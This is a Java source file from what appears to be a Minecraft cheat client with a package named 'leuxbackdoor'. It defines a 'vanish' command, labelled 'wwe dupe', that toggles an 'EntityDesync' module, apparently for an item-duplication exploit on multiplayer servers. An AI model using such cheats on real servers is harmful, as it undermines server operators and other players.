package me.accessmodifier364.leuxbackdoor.client.command.commands;

import me.accessmodifier364.leuxbackdoor.client.command.Command;
import me.accessmodifier364.leuxbackdoor.client.util.MessageUtil;
import me.accessmodifier364.leuxbackdoor.loader.ModLoader;

public class Vanish extends Command {

    public Vanish() {
        super("vanish", "wwe dupe");
    }

    public boolean get_message(String[] message) {

        if (message.length == 1) {
            MessageUtil.send_client_error_message("use vanish dismount / vanish remount");
            return true;
        }

        if (message.length >= 2) {
            StringBuilder vanishMessage = new StringBuilder();
            boolean flag = true;
            for (String word : message) {
                if (flag) {
                    flag = false;
                    continue;
                }
                vanishMessage.append(word);
            }
            if (vanishMessage.toString().equalsIgnoreCase("dismount")) {
                ModLoader.get_module_manager().get_module_with_tag("EntityDesync").set_enable();
            } else if (vanishMessage.toString().equalsIgnoreCase("remount")) {
                ModLoader.get_module_manager().get_module_with_tag("EntityDesync").set_disable();
            } else {
                MessageUtil.send_client_error_message("use vanish dismount / vanish remount");
            }
            return true;
        }

        return false;

    }

}
